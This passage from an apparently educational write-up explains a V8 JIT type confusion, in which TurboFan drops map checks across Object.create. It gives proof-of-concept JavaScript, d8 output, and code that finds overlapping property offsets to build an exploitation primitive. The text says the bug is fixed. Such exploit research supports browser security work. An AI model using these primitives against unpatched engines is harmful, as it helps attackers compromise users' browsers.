d8&amp;gt; %DebugPrint(obj)
DebugPrint: &lt;span class=&#34;hljs-number&#34;&gt;0x21700389515&lt;/span&gt;: [JS_OBJECT_TYPE]
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006d05d&lt;/span&gt; &amp;lt;Map[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;](HOLEY_ELEMENTS)&amp;gt; [DictionaryProperties]
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - elements: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007bd&lt;/span&gt; &amp;lt;FixedArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt; [HOLEY_ELEMENTS]
 - properties: &lt;span class=&#34;hljs-number&#34;&gt;0x02170038b3dd&lt;/span&gt; &amp;lt;NameDictionary[&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;]&amp;gt;
 - All own properties (excluding elements): {
   x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt; (data, dict_index: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, attrs: [WEC])
 }
&lt;span class=&#34;hljs-number&#34;&gt;0x2170006d05d&lt;/span&gt;: [Map] in OldSpace
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053419&lt;/span&gt; &amp;lt;MetaMap (&lt;span class=&#34;hljs-number&#34;&gt;0x021700053469&lt;/span&gt; &amp;lt;NativeContext[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;]&amp;gt;)&amp;gt;
 - type: JS_OBJECT_TYPE
 - instance size: &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
 - inobject properties: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
 - unused property fields: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
 - elements kind: HOLEY_ELEMENTS
 - &lt;span class=&#34;hljs-keyword&#34;&gt;enum&lt;/span&gt; length: invalid
 - dictionary_map
 - may_have_interesting_properties
 - prototype_map
 - prototype info: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006d085&lt;/span&gt; &amp;lt;PrototypeInfo&amp;gt;
 - prototype_validity_cell: &lt;span class=&#34;hljs-number&#34;&gt;0x021700000ac9&lt;/span&gt; &amp;lt;Cell value= [cleared]&amp;gt;
 - instance descriptors (own) #&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007e5&lt;/span&gt; &amp;lt;DescriptorArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt;
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - constructor: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053e91&lt;/span&gt; &amp;lt;JSFunction Object (sfi = &lt;span class=&#34;hljs-number&#34;&gt;0000021700351&lt;/span&gt;A15)&amp;gt;
 - dependent code: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007cd&lt;/span&gt; &amp;lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&amp;gt;
 - construction counter: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;

{x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After the function call, you can see the map changed from &lt;code&gt;FastProperties&lt;/code&gt; to &lt;code&gt;DictionaryProperties&lt;/code&gt;. That means the &lt;code&gt;NoWrite&lt;/code&gt; assumption is invalid. If there is no operation checking the map before and after the function call, that can lead to Type Confusion.&lt;/p&gt;
&lt;h2 id=&#34;2-2-Proof-of-Concept&#34;&gt;&lt;a href=&#34;#2-2-Proof-of-Concept&#34; class=&#34;headerlink&#34; title=&#34;2.2 Proof of Concept&#34;&gt;&lt;/a&gt;2.2 Proof of Concept&lt;/h2&gt;&lt;h3 id=&#34;Type-Confusion-PoC&#34;&gt;&lt;a href=&#34;#Type-Confusion-PoC&#34; class=&#34;headerlink&#34; title=&#34;Type Confusion PoC&#34;&gt;&lt;/a&gt;Type Confusion PoC&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;vuln&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(obj)&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property a of obj, forcing a CheckMap operation&lt;/span&gt;
    obj.a;

    &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
    Object.create(obj)

    &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj.b;
}

vuln({a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;}); &lt;span class=&#34;hljs-comment&#34;&gt;// Warm-up code&lt;/span&gt;
vuln({a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;});
%OptimizeFunctionOnNextCall(vuln); &lt;span class=&#34;hljs-comment&#34;&gt;// JIT Compile vuln&lt;/span&gt;
vuln({a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;}); &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger type-confusion - should not return 43!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;#x2019;s trigger Type Confusion using &lt;code&gt;Object.create&lt;/code&gt;. Run &lt;code&gt;d8&lt;/code&gt; with the &lt;code&gt;--allow-natives-syntax&lt;/code&gt; flag and enter the following:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;({&lt;span class=&#34;hljs-attribute&#34;&gt;a&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;})
43
&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;({&lt;span class=&#34;hljs-attribute&#34;&gt;a&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;})
43
&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; %&lt;span class=&#34;hljs-selector-tag&#34;&gt;OptimizeFunctionOnNextCall&lt;/span&gt;(&lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;)
&lt;span class=&#34;hljs-selector-tag&#34;&gt;undefined&lt;/span&gt;
&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;({&lt;span class=&#34;hljs-attribute&#34;&gt;a&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;})
0&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In the optimized (compiled) code you can observe that the return value differs.&lt;/p&gt;
&lt;p&gt;If you look at the IR graph,&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\v8\v8\out\x64.debug&amp;gt;d8 --allow-natives-syntax --trace-turbo poc.js
Concurrent recompilation has been disabled &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; tracing.
---------------------------------------------------
Begin compiling method vuln &lt;span class=&#34;hljs-keyword&#34;&gt;using&lt;/span&gt; Turbofan
---------------------------------------------------
Finished compiling method vuln &lt;span class=&#34;hljs-keyword&#34;&gt;using&lt;/span&gt; Turbofan&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;You can see that redundancy elimination removed the &lt;code&gt;CheckMaps&lt;/code&gt; at node 46 on the left. At that point, when execution passes through &lt;code&gt;JSCreateObject&lt;/code&gt; at node 28, a map transition can occur &amp;#x2014; and that is where Type Confusion can be triggered.&lt;/p&gt;
&lt;h3 id=&#34;Five-Steps-to-generate-a-Proof-of-Concept&#34;&gt;&lt;a href=&#34;#Five-Steps-to-generate-a-Proof-of-Concept&#34; class=&#34;headerlink&#34; title=&#34;Five Steps to generate a Proof of Concept&#34;&gt;&lt;/a&gt;Five Steps to generate a Proof of Concept&lt;/h3&gt;&lt;p&gt;After triggering the Type Confusion as described above, the exploit uses the side effect that occurs when accessing the object. The access phase can be divided into five steps.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create the prototype object: make a new object with in-object (inline) properties. This object will be used as the prototype for &lt;code&gt;Object.create&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Add an out-of-line property: add a property to the object&amp;#x2019;s property backing store. This property will be accessed after the Map transition.&lt;/li&gt;
&lt;li&gt;Force &lt;code&gt;CheckMap&lt;/code&gt; execution: run the &lt;code&gt;CheckMap&lt;/code&gt; operation to encourage redundancy elimination. This causes later &lt;code&gt;CheckMap&lt;/code&gt; operations to be removed.&lt;/li&gt;
&lt;li&gt;Induce a Map transition: call &lt;code&gt;Object.create&lt;/code&gt; using the object created earlier. This changes the object&amp;#x2019;s structure and transitions it to a new hidden class (Map).&lt;/li&gt;
&lt;li&gt;Access the out-of-line property: finally, access the out-of-line property.&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;In-object properties (Inline properties)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Inline properties are stored directly in the object&amp;#x2019;s memory. Because no extra memory indirection is required when accessing them, they&amp;#x2019;re the fastest and most efficient storage. V8 uses the object&amp;#x2019;s Map (hidden class) to compute the precise offset of each inline property.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Out-of-line properties (Out-of-line / backing store properties)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When an object has more properties than fit in its inline property slots, the remaining properties are stored out-of-line in a separate backing store (property backing store). Accessing these properties requires an extra level of indirection compared to inline properties.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Speculation Guard&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CheckMap&lt;/code&gt; is an operation that verifies an object&amp;#x2019;s hidden class matches the expected one; it serves as a speculation guard. The JIT compiler analyzes runtime patterns and speculates that a variable&amp;#x2019;s type will remain constant, then generates optimized code based on that assumption. &lt;code&gt;CheckMap&lt;/code&gt; confirms whether that speculation still holds.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Words alone may be unclear, so let&amp;#x2019;s inspect the code in the next section.&lt;/p&gt;
&lt;h2 id=&#34;2-3-Exploiting-a-Type-Confusion&#34;&gt;&lt;a href=&#34;#2-3-Exploiting-a-Type-Confusion&#34; class=&#34;headerlink&#34; title=&#34;2.3 Exploiting a Type Confusion&#34;&gt;&lt;/a&gt;2.3 &lt;strong&gt;Exploiting a Type Confusion&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&#34;Map-Transition&#34;&gt;&lt;a href=&#34;#Map-Transition&#34; class=&#34;headerlink&#34; title=&#34;Map Transition&#34;&gt;&lt;/a&gt;Map Transition&lt;/h3&gt;&lt;p&gt;In section 2.2 we used &lt;code&gt;%OptimizeFunctionOnNextCall&lt;/code&gt;, which lets a developer force optimization timing. Instead, we&amp;#x2019;ll let V8 decide when to optimize by making the function hot through repeated calls. As we&amp;#x2019;ve seen, ordinary JavaScript goes through V8&amp;#x2019;s optimization pipeline: when V8 deems a function &amp;#x201C;hot,&amp;#x201D; it uses the JIT compilers (Maglev, TurboFan) to generate optimized native code for it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;vuln&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(obj)&lt;/span&gt; &lt;/span&gt;{
  &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property a of obj, forcing a CheckMap operation&lt;/span&gt;
  obj.a;

  &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
  Object.create(obj)

  &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj.b;
}

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
  let obj = {a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// Create object with in-line properties&lt;/span&gt;
  obj.b = &lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// Store property out-of-line in backing store&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) { %DebugPrint(obj); }
  vuln(obj); &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger type-confusion&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i = &lt;span class=&#34;hljs-number&#34;&gt;9999&lt;/span&gt;) { %DebugPrint(obj); }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Save the above code to a JSON file and run it with &lt;code&gt;d8&lt;/code&gt;; you&amp;#x2019;ll get results like the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The object&amp;#x2019;s Map (which holds its layout) changed from &lt;code&gt;FastProperties&lt;/code&gt; to &lt;code&gt;DictionaryProperties&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;(The bottom of the image is slightly cut off,) but you can also see that the property backing store transitioned from a &lt;code&gt;FixedArray&lt;/code&gt; to a &lt;code&gt;NameDictionary&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;V8 stores an object&amp;#x2019;s excess properties (those that overflow inline slots) in a separate memory area called the property backing store. This backing store is implemented as a &lt;strong&gt;FixedArray&lt;/strong&gt; called &lt;strong&gt;PropertyArray&lt;/strong&gt;. Thus, the &lt;strong&gt;PropertyArray&lt;/strong&gt; can be seen as a special-purpose &lt;strong&gt;FixedArray&lt;/strong&gt; used to hold an object&amp;#x2019;s out-of-line properties.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;FixedArray&lt;/code&gt; and &lt;code&gt;NameDictionary&lt;/code&gt; are composed as follows:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;FixedArray (PropertyArray) is a simple array structure with contiguous value slots. It stores an object&amp;#x2019;s out-of-line (those that exceed the inline slots) property &lt;strong&gt;values in order&lt;/strong&gt;. A simplified layout looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs gherkin&#34;&gt;FixedArray:
[ header |&lt;span class=&#34;hljs-string&#34;&gt; slot0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; slot1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; slot2 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; slot3 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; ... ]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;NameDictionary stores (key, value, details) tuples in a hashtable/dictionary form. Because it must keep the property name, value, and property attributes (details) together, its structure is more complex. The per-process hash seed (randomness) is mixed in, so the placement of keys in the table changes on every run. In short, NameDictionary is a complicated hash-table structure whose property storage locations are randomized each execution, making them hard to predict. A simplified layout looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs gherkin&#34;&gt;NameDictionary:
[ header |&lt;span class=&#34;hljs-string&#34;&gt; ... &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; key0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; value0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; details0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; key1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; value1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; details1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt;...]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So &amp;#x2014; what side effects can happen if properties of different types get confused?&lt;/p&gt;
&lt;p&gt;When properties that used to be stored sequentially in a &lt;code&gt;FixedArray&lt;/code&gt; (&lt;code&gt;0&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt;, &lt;code&gt;2&lt;/code&gt;, &amp;#x2026;) are converted to a &lt;code&gt;NameDictionary&lt;/code&gt;, they end up scattered at completely different memory offsets. The JIT-compiled code, however, was generated assuming the &lt;code&gt;FixedArray&lt;/code&gt; offsets. If execution continues using those fixed &lt;code&gt;FixedArray&lt;/code&gt; offsets while the backing store is actually a &lt;code&gt;NameDictionary&lt;/code&gt;, you end up accessing entirely different fields &amp;#x2014; sometimes those fields will accidentally line up so that a different property appears to be at the same offset. By triggering this situation you can gain an exploitable primitive.&lt;/p&gt;
&lt;p&gt;As shown above, hot code produced by repeating a pattern causes the JIT compiler to assume a fixed map and generate native code that accesses properties at fixed offsets. For example, &lt;code&gt;obj.p10&lt;/code&gt; may be compiled to read from &lt;code&gt;base + offset + 10*8&lt;/code&gt;. If that compiled code remains and you trigger a map transition at runtime, the object&amp;#x2019;s map can change from &lt;code&gt;FastProperties&lt;/code&gt; &amp;#x2192; &lt;code&gt;DictionaryProperties&lt;/code&gt;, swapping the backing store from a &lt;code&gt;FixedArray&lt;/code&gt; to a &lt;code&gt;NameDictionary&lt;/code&gt;. But the JIT code doesn&amp;#x2019;t know about the change and keeps reading at the fixed &lt;code&gt;FixedArray&lt;/code&gt; offsets. Because the two layouts place fields differently, &lt;strong&gt;the same read will end up reading some other field&lt;/strong&gt; in memory.&lt;/p&gt;
&lt;h3 id=&#34;Finding-Overlapping-Properties&#34;&gt;&lt;a href=&#34;#Finding-Overlapping-Properties&#34; class=&#34;headerlink&#34; title=&#34;Finding Overlapping Properties&#34;&gt;&lt;/a&gt;Finding Overlapping Properties&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Create object with one inline and 31 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: -i
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;First, this creates an object with one inline property (&lt;code&gt;inline&lt;/code&gt;) and 31 out-of-line properties (&lt;code&gt;p1&lt;/code&gt; ~ &lt;code&gt;p31&lt;/code&gt;). We plant negative values in each out-of-line property so that, when we later dump memory, we can clearly identify only the values we inserted (they won&amp;#x2019;t be confused with small positive dictionary-internal values). The single inline access like &lt;code&gt;obj.inline&lt;/code&gt; exists so the JIT will generate a &lt;code&gt;CheckMap&lt;/code&gt; and form the assumption &amp;#x201C;this object has this map.&amp;#x201D; In other words, the &lt;code&gt;obj.inline&lt;/code&gt; access causes a &lt;strong&gt;map-check&lt;/strong&gt; inside &lt;code&gt;vuln()&lt;/code&gt;. After we cause the map transition, the JIT will keep using the old assumption and Type Confusion occurs.&lt;/p&gt;
&lt;p&gt;Let&amp;#x2019;s look at the full PoC that finds overlapping property pairs.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Create object with one inline and 31 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: -i
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Find a pair of properties where p1 is stored at the same offset&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;// in the FixedArray as p2 is in the NameDictionary&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of all 32 property names such as p1..p32&lt;/span&gt;
    let pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create eval of our vuln function that will generate code during runtime&lt;/span&gt;
    eval(`
    function vuln(obj) {
      &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property inline of obj, forcing a CheckMap operation&lt;/span&gt;
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing out-of-bound properties&lt;/span&gt;
      ${pNames.&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;((p) =&amp;gt; `let ${p} = obj.${p};`).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}
      return [${pNames.join(&amp;apos;, &amp;apos;)}];
    }
  `)

    &lt;span class=&#34;hljs-comment&#34;&gt;// JIT code to trigger vuln&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        let res = vuln(makeObj());
        &lt;span class=&#34;hljs-comment&#34;&gt;// Print FixedArray when i=1 and Dictionary when i=9999&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i == &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; || i == &lt;span class=&#34;hljs-number&#34;&gt;9999&lt;/span&gt;) {
            print(res);
        }
    }
}

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties&amp;quot;&lt;/span&gt;);
findOverlappingProperties();&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The vulnerable &lt;code&gt;vuln()&lt;/code&gt; function dynamically generates code at runtime (using &lt;code&gt;eval&lt;/code&gt; and template literals) that reads &lt;code&gt;p1&lt;/code&gt;~&lt;code&gt;p31&lt;/code&gt; and returns them as an array. This avoids manually writing many read statements and forces the JIT to produce code that reads many properties at once; repeated execution triggers profiling and then optimization into code that uses fixed offsets.&lt;/p&gt;
&lt;p&gt;The search strategy is as follows: plant many candidate properties, run the function many times to make it hot so the JIT compiles it, then deliberately force a map transition and compare the read results before and after the transition. Indices where the results differ identify candidate overlapping locations.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: In &lt;code&gt;../v8&lt;/code&gt; (a recent checkout) you can verify that the bug is no longer reproducible.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;By running the same object shape thousands of times to drive JIT compilation, then intentionally causing the map transition and comparing reads in the FixedArray vs NameDictionary states, you can find where the negative values moved &amp;#x2014; those indices are candidates. From those candidates, discard trivial cases where &lt;code&gt;pX&lt;/code&gt; overlaps with itself; keep only pairs where different properties collide (&lt;code&gt;pA &amp;#x2194; pB&lt;/code&gt;) and verify they match. The code above is a full PoC that finds overlapping property pairs.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Function that creates an object with one in-line and 32 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: -i
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Function that finds a pair of properties where p1 is stored at the same offset&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;// in the FixedArray as p2 in the NameDictionary&lt;/span&gt;
let p1, p2;

&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of all 32 property names such as p1..p32&lt;/span&gt;
    let pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create eval of our vuln function that will generate code during runtime&lt;/span&gt;
